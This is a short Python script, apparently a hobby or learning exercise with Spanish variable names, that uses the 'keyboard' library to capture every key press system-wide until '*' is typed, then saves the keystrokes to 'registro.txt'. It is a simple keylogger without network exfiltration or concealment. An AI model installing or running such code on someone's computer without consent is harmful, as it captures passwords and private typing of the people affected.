import keyboard

escrito = []

def IKWYD(event):
    tecla = event.name
    if tecla == "enter" or tecla == "space":
        tecla = " "
    escrito.append(tecla)

keyboard.on_press(IKWYD)
keyboard.wait("*")

with open("registro.txt", "w", encoding="utf-8") as f:
            f.write(" ".join(escrito))
print(escrito)
